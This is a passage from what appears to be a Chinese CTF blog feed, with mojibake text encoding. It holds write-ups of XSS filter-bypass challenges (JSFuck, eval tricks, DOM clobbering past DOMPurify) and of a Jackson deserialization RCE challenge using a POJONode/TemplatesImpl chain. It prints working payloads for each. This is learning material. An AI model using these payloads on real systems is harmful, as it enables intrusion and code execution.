punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="Mafia"><a href="#Mafia" class="headerlink" title="Mafia"></a>Mafia</h5><pre class="line-numbers language-html"><code class="language-html">mafia = (new URL(location).searchParams.get('mafia') || '1+1')mafia = mafia.slice(0, 50)mafia = mafia.replace(/[\`\'\"\+\-\!\\\[\]]/gi, '_')mafia = mafia.replace(/alert/g, '_')eval(mafia)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤<code>alert</code>ï¼Œåˆå› ä¸ºè¿‡æ»¤äº†<code>&quot; &#39; </code>ç­‰è¡¨ç¤ºå­—ç¬¦ä¸²çš„æ ‡è¯†ï¼Œæ„Ÿè§‰æ²¡æ³•ç”¨<code>atob</code>è¿™ç§ç¼–è§£ç ç»•ï¼Ÿç”¨<code>prompt</code>å€’æ˜¯å¯ä»¥ä½†æ˜¯è¦æ±‚ç”¨<code>alert</code>ã€‚</p><p>ç…§æŠ„ç­”æ¡ˆå¥½äº†ã€‚</p><p>ç»•è¿‡æ–¹æ³•:</p><ol><li>å®šä¹‰åŒ¿åå‡½æ•°ï¼Œåˆ©ç”¨åŒ¿åå‡½æ•°çš„å‚æ•°æ„é€ payloadï¼ŒåŒæ—¶ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥ç»•è¿‡alertå­—ç¬¦ä¸²çš„æ£€æµ‹ã€‚</li><li>åˆ©ç”¨æ•°å­—å’Œå­—ç¬¦ä¸²ä¹‹é—´çš„äº’ç›¸è½¬æ¢ï¼Œæ¥ç»•è¿‡é’ˆå¯¹alertçš„æ£€æµ‹ã€‚</li><li>åœ¨URLåœ°å€åé¢åŠ ä¸Š#${payload}ï¼Œç„¶åé€šè¿‡location.hash.slice(1)æ¥è·å–payloadï¼Œä¹Ÿèƒ½åšåˆ°ç»•è¿‡æ£€æµ‹ã€‚</li></ol><p>æ„é€ payloadï¼š</p><pre><code>// åŒ¿åå‡½æ•°?mafia=Function(/ALERT(1337)/.source.toLowerCase())()// æ•°å­—è½¬å­—ç¬¦ä¸²ï¼Œå°†30è¿›åˆ¶çš„æ•°å­—8680439è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå°±æ˜¯alert?mafia=eval(8680439..toString(30))(1337)// åœ¨URLåé¢åŠ ä¸Š #alert(1337)?mafia=eval(location.hash.slice(1))#alert(1337)</code></pre><p>ç¬¬ä¸‰ä¸ªè§£æ³•æœ‰ç‚¹æ„æ€ã€‚é€šè¿‡<code>location.hash</code>è·å–<code>#</code>åçš„å­—ç¬¦ï¼Œä½†æ˜¯<code>html</code>æ˜¯ä¸ä¼šå–<code>#</code>åé¢ä½œä¸ºå‚æ•°çš„ï¼Œå› æ­¤è¿™æ ·ä¹Ÿèƒ½ç»•è¿‡æ£€æµ‹ã€‚</p><h5 id="Ok-Boomerï¼ˆDOMç ´åï¼‰"><a href="#Ok-Boomerï¼ˆDOMç ´åï¼‰" class="headerlink" title="Ok, Boomerï¼ˆDOMç ´åï¼‰"></a>Ok, Boomerï¼ˆDOMç ´åï¼‰</h5><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>boomer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Ok, Boomer.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    boomer<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'boomer'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"Ok, Boomer"</span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>ok<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»ˆäºåˆ°<code>dom</code>ç ´åäº†ã€‚</p><p>ç”¨å‰é¢çš„<code>area</code>æ ‡ç­¾<code>toString</code>çš„ç‰¹æ€§å³å¯èµ‹å€¼<code>ok</code>ï¼Œå› ä¸º<code>setTimeout</code>ä¼šè‡ªåŠ¨æ‰§è¡Œ<code>toString</code>æ–¹æ³•ã€‚å¾ˆå®¹æ˜“å°±èƒ½æ„é€ å‡ºè¿™æ ·çš„å½¢å¼ã€‚</p><pre><code>&lt;area id=ok href=&quot;javascript:alert(1337)&quot;&gt;</code></pre><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<code>href</code>çš„å€¼è¦éµå®ˆ<code>protocol:uri</code>çš„æ ¼å¼ï¼Œä¸éµå®ˆçš„è¯å°±æˆè¿™æ ·äº†ï¼š</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701598173523.png" alt="1701598173523" width="5%" height="5%" /><p>ç„¶è€Œè¿™æ ·æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºè¿™é‡Œç»è¿‡äº†<code>DOMPurify.sanitize</code>è¿‡æ»¤ã€‚æˆ‘ä»¬å¯ä»¥çœ‹<code>DOM purify</code>çš„æºç (<a href="https://github.com/cure53/DOMPurify/blob/main/src/regexp.js)%E3%80%82">https://github.com/cure53/DOMPurify/blob/main/src/regexp.js)ã€‚</a></p><p>è¿™é‡Œè®¾å®šäº†ç™½åå•åè®®ã€‚</p><pre><code>export const IS_ALLOWED_URI = seal(  /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i // eslint-disable-line no-useless-escape);</code></pre><p>å¯ä»¥ç”¨åˆ°çš„åè®®ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1701598575781.png" alt="1701598575781" width="5%" height="5%" /><p>è¿™é‡Œè¯•äº†å‡ ä¸ªï¼Œè¿™äº›æ˜¯èƒ½æ‰“é€šçš„ã€‚</p><pre><code>&lt;area id=ok href=&quot;xmpp:alert(1)&quot;&gt;&lt;area id=ok href=&quot;cid:alert(1)&quot;&gt;&lt;area id=ok href=&quot;mailto:alert(1)&quot;&gt;&lt;area id=ok href=&quot;callto:alert(1)&quot;&gt;&lt;area id=ok href=&quot;tel:alert(1)&quot;&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> æ—¥å¸¸å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¦™å±±æ¯å†³èµ›Secure Systemå¤ç°</title>
      <link href="/2023/11/22/secure-system/"/>
      <url>/2023/11/22/secure-system/</url>
      
        <content type="html"><![CDATA[<h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p><code>META-INF</code>çœ‹<code>pom.xml</code>ï¼Œå­˜åœ¨<code>Springboot 2.7.12</code>ï¼Œ<code>JackSon</code>ä¾èµ–ã€‚</p><p><code>BOOT-INF</code>çœ‹æºç ã€‚</p><p>åªæœ‰ä¸€ä¸ª<code>/safeobject</code>è·¯ç”±ã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/safeobject"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">start</span><span class="token punctuation">(</span>String obj<span class="token punctuation">,</span> String classes<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>classes<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Object"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>classes<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"LinkedHashMap"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Class <span class="token class-name">c</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>classes<span class="token punctuation">)</span><span class="token punctuation">;</span>            SecurityCheck var10000 <span class="token operator">=</span> isSafe<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>SecurityCheck<span class="token punctuation">.</span><span class="token function">isSafe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Object o <span class="token operator">=</span> SecurityCheck<span class="token punctuation">.</span><span class="token function">deObject</span><span class="token punctuation">(</span>mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> o<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                StringBuilder sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                var10000 <span class="token operator">=</span> isSafe<span class="token punctuation">;</span>                Iterator var5 <span class="token operator">=</span> SecurityCheck<span class="token punctuation">.</span><span class="token function">ismap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    Object item <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s <span class="token operator">=</span> SecurityCheck<span class="token punctuation">.</span><span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>                    sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>SecurityCheck<span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ è¿›æ¥çš„<code>classes</code>å¿…é¡»ä¸åŒ…å«<code>LinkedHashMap</code>ä»¥åŠ<code>Object</code>æ‰ä¼šèµ°åˆ°<code>if</code>é‡Œï¼Œä¹‹ååŠ è½½<code>classes</code>ç±»ã€‚</p><p>ç”±äº<code>SecurityCheck</code>çš„<code>safe</code>å˜é‡é»˜è®¤ä¸º<code>true</code>ï¼Œæ‰€ä»¥é»˜è®¤èµ°ç¬¬ä¸€ä¸ª<code>if</code>ã€‚</p><p>æƒ³æ³•æ˜¯ç¬¬ä¸€ä¸ª<code>if</code>ä¸­ç›´æ¥æ‰“ä¸ª<code>POJONODE</code>ï¼Œä¹‹å<code>o.toString</code>è°ƒç”¨<code>POJONODE#toString</code>æ–¹æ³•è§¦å‘<code>RCE</code>.</p><pre><code>POJONODE#toString  //åååºåˆ—åŒ–è§¦å‘com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code></pre><p><code>ObjectMapper#readValue</code>æ–¹æ³•æ˜¯ç”¨æ¥æ¢å¤å¯¹è±¡ç”¨çš„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡å®šçš„ç±»åï¼Œç¬¬ä¸€ä¸ªæ˜¯è¦ååºåˆ—åŒ–æˆçš„å¯¹è±¡ã€‚</p><p>è€Œè¿™é¢˜çš„ä¸€ä¸ªéš¾ç‚¹å¯èƒ½å°±æ˜¯éœ€è¦è¯»æ‡‚<code>deObject</code>æ–¹æ³•ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValues</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> String fieldName<span class="token punctuation">,</span> Object fieldValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> fieldName<span class="token punctuation">,</span> <span class="token function">deObject</span><span class="token punctuation">(</span>fieldValue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">deObject</span><span class="token punctuation">(</span>Object ob<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ob <span class="token keyword">instanceof</span> <span class="token class-name">LinkedHashMap</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        LinkedHashMap map <span class="token operator">=</span> <span class="token punctuation">(</span>LinkedHashMap<span class="token punctuation">)</span>ob<span class="token punctuation">;</span>        String type <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"@type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token string">""</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> type <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>            Object obj <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Iterator ir <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>ir<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                String key <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>ir<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Object value <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"@type"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    Field field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>field <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token function">setFieldValues</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> obj<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> map<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> ob<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œ<code>instanceof</code>ç”¨<code>LinkedHashMap</code>çš„å­ç±»ç»•è¿‡å°±è¡Œï¼Œéšä¾¿æ‰¾ä¸€ä¸ª<code>org.springframework.core.annotation.AnnotationAttributes</code>ã€‚</p><p><code>deObject</code>æ˜¯ä¸€ä¸ªæ¢å¤ç±»å±æ€§çš„æ–¹æ³•ï¼Œå¹¶ä¸”<code>setFieldValue</code>é‚£é‡Œä¼šå¾ªç¯è°ƒç”¨<code>deObject</code>ã€‚è¿™æ˜¯ä¸ºäº†å¤„ç†å±æ€§æ˜¯ä¸€ä¸ªç±»çš„æƒ…å†µï¼Œæ¯”å¦‚è¯´åœ¨è¿›è¡Œ<code>jackson</code>æ”»å‡»çš„æ—¶å€™ï¼Œ<code>POJONODE</code>çš„<code>_value</code>å¾ˆæ˜æ˜¾æ˜¯ä¸ª<code>TemplatesImpl</code>ï¼Œå¦‚æœä¸è¿™ä¹ˆé€’å½’å¤„ç†é‚£ä¹ˆä¸å¯èƒ½ç»™<code>_value</code>èµ‹å€¼ä¸€ä¸ª<code>object</code>ã€‚</p><p>äºæ˜¯æ“å‡ºæ¥è¿™æ ·ä¸€ä¸ª<code>payload</code>ï¼Œ<code>_bytecodes</code>è¿™é‡Œæ˜¯ä¸ªå­—èŠ‚æ•°ç»„ï¼š</p><pre><code>classesï¼šorg.springframework.core.annotation.AnnotationAttributesobjï¼š&#123;&quot;@type&quot;:&quot;com.fasterxml.jackson.databind.node.POJONode&quot;,&quot;_value&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;123&quot;,&quot;123123&quot;,...],&quot;_name&quot;:&quot;squirt1e&quot;,&quot;_tfactory&quot;:&#123;&#125;,&quot;_outputProperties&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;&#125;,&quot;_name&quot;:&quot;a&quot;&#125;&#125;</code></pre><p>ä½†æ˜¯è¿™é‡Œå®é™…æ˜¯æ‰“ä¸é€šçš„ã€‚å› ä¸º<code>POJONODE</code>åªæœ‰ä¸€ä¸ªå¸¦å‚æ•°çš„æ„é€ æ–¹æ³•ï¼Œä½†æ˜¯é¢˜ç›®åå°„å®ä¾‹åŒ–ç±»è¿™é‡Œè°ƒç”¨çš„æ˜¯æ— å‚åå°„ï¼Œåˆ°ä¸‹é¢ä»£ç é‚£ä¸€è¡Œç›´æ¥æŠ¥é”™äº†ã€‚</p><pre><code>Object obj = clazz.newInstance();</code></pre><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>çœŸæ­£çš„åˆ©ç”¨ç‚¹åœ¨<code>else</code>åˆ†æ”¯çš„ååºåˆ—åŒ–æ–¹æ³•ä¸­ï¼Œå› ä¸ºå­˜åœ¨<code>Jackson</code>ä¾èµ–ï¼Œå¯ä»¥æ‰“ä¸ª<code>Jackson</code>å…¨ç‰ˆæœ¬é€šæ€é“¾å­ã€‚</p><pre class="line-numbers language-java"><code class="language-java">StringBuilder sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10000 <span class="token operator">=</span> isSafe<span class="token punctuation">;</span>Iterator var5 <span class="token operator">=</span> SecurityCheck<span class="token punctuation">.</span><span class="token function">ismap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Object item <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s <span class="token operator">=</span> SecurityCheck<span class="token punctuation">.</span><span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>    sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>SecurityCheck<span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//exploit</span><span class="token punctuation">}</span><span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆæˆ‘ä»¬è¦è®¾ç½®<code>SecurityCheck</code>ç±»çš„<code>safe</code>ä¸º<code>false</code>ï¼Œè¿™æ ·æ‰èƒ½èµ°åˆ°<code>else</code>é‚£é‡Œã€‚</p><pre><code>&#123;&quot;@type&quot;:&quot;ctf.nese.SecurityCheck&quot;,&quot;safe&quot;:false&#125;</code></pre><p>æ†¨æ‰¹äº†ï¼Œè¿™é‡Œåªè®¾ç½®<code>safe</code>è¿˜ä¸è¡Œï¼Œæˆ‘ä»¬è¿˜è¦æŠŠ<code>payload</code>ä¼ è¿›å»è¿™æ ·ç¬¬äºŒéæ‰èƒ½åŠ è½½<code>payload</code>ã€‚è¿™é‡Œè¿˜æœ‰ä¸ªå°é—®é¢˜ï¼Œå°±æ˜¯ç»™<code>treeMap</code>èµ‹å€¼æ˜¯æœ‰äº›è¯´æ³•çš„ã€‚<code>treeMap</code>æ˜¯ä¸ª<code>hashSet</code>ç±»å‹ï¼Œæˆ‘ä»¬é€šè¿‡<code>deObject</code>æ–¹æ³•æ€ä¹ˆç»™ä»–èµ‹å€¼å‘¢ï¼Ÿæˆ‘æ„Ÿè§‰è¿™ä¸ªé¢˜éš¾ç‚¹å°±åœ¨è¿™é‡Œã€‚çº¿ä¸‹ä¸å¥½ä¸Šç½‘å¾ˆæœ‰å¯èƒ½ä¸çŸ¥é“æ€ä¹ˆèµ‹å€¼ã€‚</p><p>çœ‹<code>HashSet</code>çš„æ„é€ å‡½æ•°ï¼Œå…¶å®å°±æ˜¯å®ä¾‹åŒ–ä¸€ä¸ª<code>HashMap</code>ã€‚å› æ­¤ä¸éš¾æ¨æ–­å‡º<code>HashSet</code>å°±æ˜¯åŸºäº<code>HashMap</code>å®ç°çš„ï¼Œå‡†ç¡®æ¥è¯´æ˜¯é˜‰å‰²ç‰ˆã€‚</p><pre><code>    public HashSet() &#123;        map = new HashMap&lt;&gt;();    &#125;</code></pre><p>è€Œä»–çš„<code>add</code>æ–¹æ³•å°±æ˜¯å¾€<code>HashMap</code>é‡Œå¡è¿›å»ä¸€ä¸ªé”®å€¼å¯¹ï¼Œ<code>HashMap</code>çš„é”®å°±æ˜¯<code>HashSet</code>çš„å€¼ï¼Œè€Œåé¢çš„<code>PRESENT</code>åªèµ·ä¸€ä¸ªå 